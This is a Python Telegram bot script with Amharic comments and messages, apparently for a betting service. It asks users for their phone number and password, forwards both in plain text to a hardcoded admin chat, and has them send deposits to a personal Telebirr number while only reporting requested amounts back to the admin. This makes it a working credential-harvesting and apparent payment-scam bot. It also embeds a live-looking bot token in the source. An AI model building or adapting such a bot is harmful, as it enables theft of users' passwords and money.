import os
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# 1. Render ሰርቨር 'Timed Out' እንዳያደርገው ፖርት የሚከፍት ሲስተም
def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    print(f"🌍 Dummy server running on port {port}")
    server.serve_forever()

# ያንተ ትክክለኛው የቴሌግራም ID ቁጥር
ADMIN_ID = "8647863200" 

# የውይይት ደረጃዎች
PHONE, PASSWORD, MENU = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"ሰላም {user.first_name}! ወደ ቦቱ በደህና መጡ።\n\nእባክዎ መጀመሪያ የስልክ ቁጥርዎን ያስገቡ፡",
        reply_markup=ReplyKeyboardRemove()
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone
    await update.message.reply_text("አመሰግናለሁ! አሁን ደግሞ የይለፍ ቃልዎን (Password) ያስገቡ፡")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    phone = context.user_data['phone']
    user = update.effective_user
    
    await update.message.reply_text("በስኬት ተመዝግበዋል! ✅")
    
    # መረጃውን ለአንተ መላኪያ ጽሑፍ
    log_message = (
        f"🔔 **አዲስ ተጠቃሚ ተመዝግቧል!**\n\n"
        f"👤 ስም: {user.first_name}\n"
        f"🆔 ID: {user.id}\n"
        f"📱 ስልክ: `{phone}`\n"
        f"🔑 ፓስወርድ: `{password}`"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=log_message, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending to admin: {e}")

    # ዋናው ሜኑ ከነ አዲሶቹ ቁልፎች ጋር
    keyboard = [
        [
            InlineKeyboardButton("💰 Deposit", callback_data='btn_deposit'),
            InlineKeyboardButton("💸 Withdraw", callback_data='btn_withdraw')
        ],
        [
            # Support ሲነካ ቀጥታ ወደ ቻናልህ የሚወስድ ቁልፍ
            InlineKeyboardButton("📞 Support (ቻናል)", url="https://t.me/shamobetsuport18")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፦", reply_markup=reply_markup)
    return MENU

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # የ Deposit ማስተካከያ በቴሌብር ቁጥርህ
    if query.data == 'btn_deposit':
        deposit_text = (
            "💰 **የDeposit ማዘዣ**\n\n"
            "እባክዎ በቴሌብር (**0936469876**) ያላኩትን የብር መጠን ቁጥር ብቻ እዚህ ላይ ይላኩ፦"
        )
        await query.message.reply_text(deposit_text, parse_mode="Markdown")
    elif query.data == 'btn_withdraw':
        await query.message.reply_text("💸 እባክዎ ማውጣት (Withdraw) የሚፈልጉትን የብር መጠን ቁጥር ብቻ ይላኩ፦")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    phone = context.user_data.get('phone', 'ያልታወቀ')
    
    if text.isdigit():
        await update.message.reply_text(f"የ {text} ብር ጥያቄዎ ተቀባይነት አግኝቷል! በቅርቡ ይስተናገዳል። ⏳")
        
        # ተጠቃሚው የላከውን የብር መጠን ለአንተ የሚልክልህ ክፍል
        admin_report = (
            f"💵 **አዲስ የገንዘብ ጥያቄ ደርሷል!**\n\n"
            f"👤 ስም: {user.first_name}\n"
            f"📱 ስልክ: `{phone}`\n"
            f"💰 የብር መጠን: `{text} ብር`"
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report, parse_mode="Markdown")
        except Exception as e:
            print(f"Error sending report to admin: {e}")
    else:
        await update.message.reply_text("እባክዎ ቁጥር ብቻ ያስገቡ ወይም ከላይ ካሉት ቁልፎች አንዱን ይጫኑ።")
    return MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ሂደቱ ተቋርጧል። እንደገና ለመጀመር /start ይበሉ።", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

if __name__ == '__main__':
    # ሰርቨሩን በሌላ Thread ላይ ማስጀመር (Render 'Failed' እንዳይል)
    threading.Thread(target=run_dummy_server, daemon=True).start()

    # የቦቱ Token
    app = ApplicationBuilder().token("8960492606:AAEQKJN5S70C3u6OQVVGUkfLNEC7K2w7deA").build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            MENU: [
                CallbackQueryHandler(button_click),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv_handler)
    app.run_polling()
